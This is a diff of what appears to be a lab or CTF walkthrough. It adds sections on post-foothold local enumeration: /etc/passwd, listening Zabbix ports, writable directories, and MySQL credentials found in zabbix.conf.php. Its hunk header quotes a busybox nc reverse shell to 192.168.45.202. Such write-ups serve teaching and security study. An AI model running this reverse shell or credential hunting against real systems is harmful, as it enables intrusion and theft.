@@ -86,4 +86,38 @@ busybox nc 192.168.45.202 4444 -e /bin/bash
 
 ![shell](Images/shell.png)
 
+## Local Enumeration
 
+Once the initial foothold was established, local enumeration consisted of reviewing the `/etc/passwd` file to identify local users.
+
+![passwd](Images/passwd.png)
+
+The system contained accounts for the **ubuntu**, **mysql** and **zabbix**. The presence of the **mysql** and **zabbix** users suggested that these applications were installed on the system. 
+
+Following from this I investigated any services or ports that may be accessible locally.
+```
+ss -lntu
+```
+
+![ports](Images/ports.png)
+
+Ports **10051** and **10050** were found to be listening. These ports are commonly associated with Zabbix, suggesting a tunnel would be required to interact with the Zabbix web interface. 
+
+Continuing with my local enumeration, writable directories where identified:
+```
+find / -writable -type d 2>/dev/null
+```
+
+![directories](Images/directories.png)
+
+## Credential Discovery
+
+Among these results, the `/etc/zabbix/web` directory stood out as I suspected it may contain configuration files for the Zabbix the application I suspected was running on the system. 
+
+![conf](Images/conf.png)
+
+Examination of the `zabbix.conf.php` file revealed credentials for the local MySQL database.
+
+![credentials](Images/credentials.png)
+
+### Database Enumeration
